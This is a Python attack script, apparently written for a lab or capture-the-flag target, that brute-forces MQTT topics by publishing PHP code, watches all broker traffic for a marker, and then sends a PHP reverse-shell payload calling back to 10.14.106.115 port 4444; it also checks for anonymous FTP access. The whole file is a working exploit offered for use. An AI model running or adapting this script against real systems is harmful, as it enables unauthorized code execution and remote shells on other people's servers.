#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import threading
import time
import argparse
import sys
import os
from ftplib import FTP

# --- Global ---
messages_received_count = 0
found_flag = threading.Event()
found_topic = ""

# --- Listener Thread ---
def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"[+] Connected to MQTT broker at {userdata['host']}:{userdata['port']}")
        client.subscribe('#')
        print("[+] Subscribed to all topics (#)")
    else:
        print(f"[!] Connection failed (rc={rc})")
        sys.exit(1)

def on_message(client, userdata, msg):
    global messages_received_count, found_flag, found_topic
    messages_received_count += 1
    payload = msg.payload.decode('utf-8', errors='ignore')
    print(f"[{messages_received_count}] {msg.topic}: {payload}")

    if "OWNED123" in payload:
        print("[!!!] Confirmed payload trigger via MQTT message!")
        found_flag.set()
        found_topic = msg.topic


def mqtt_listener(host, port):
    client = mqtt.Client(userdata={"host": host, "port": port})
    client.on_connect = on_connect
    client.on_message = on_message
    client.connect(host, port, 60)
    client.loop_forever()

# --- Fuzzer Thread ---
def mqtt_fuzzer(host, port, wordlist_path):
    client = mqtt.Client()
    client.connect(host, port, 60)
    with open(wordlist_path, "r") as f:
        for word in f:
            word = word.strip()
            topic = f"expose/{word}"
            test_payload = '<?php echo "OWNED123"; ?>'
            print(f"[*] Trying: {topic}")
            client.publish(topic, test_payload)
            time.sleep(0.1)

            if found_flag.is_set():
                print(f"[+] SUCCESS: {topic} triggered execution!")
                shell_payload = '<?php system("bash -c \\\"bash -i >& /dev/tcp/10.14.106.115/4444 0>&1\\\""); ?>'
                print(f"[!] Sending reverse shell payload to {topic}")
                client.publish(topic, shell_payload)
                return

    print("[-] Fuzzing complete. No successful topic found.")

# --- FTP Watcher (Optional Enhancement) ---
def ftp_check(ip):
    try:
        ftp = FTP(ip)
        ftp.login()
        files = ftp.nlst()
        print(f"[*] FTP Files: {files}")
        ftp.quit()
        return files
    except Exception as e:
        print(f"[!] FTP check failed: {e}")
        return []

# --- Main ---
def main():
    parser = argparse.ArgumentParser(description="MQTT Listener + Topic Fuzzer")
    parser.add_argument("--host", required=True, help="MQTT broker IP")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--wordlist", required=True, help="Wordlist file path for brute-force")
    args = parser.parse_args()

    # Start listener thread
    t_listener = threading.Thread(target=mqtt_listener, args=(args.host, args.port), daemon=True)
    t_listener.start()

    # Start fuzzer thread
    t_fuzzer = threading.Thread(target=mqtt_fuzzer, args=(args.host, args.port, args.wordlist))
    t_fuzzer.start()

    # Wait for fuzzer to finish
    t_fuzzer.join()
    if found_flag.is_set():
        print(f"[!!!] Final Result: {found_topic} succeeded!")
    else:
        print("[-] No working topic found. Try refining the wordlist.")

if __name__ == "__main__":
    main()
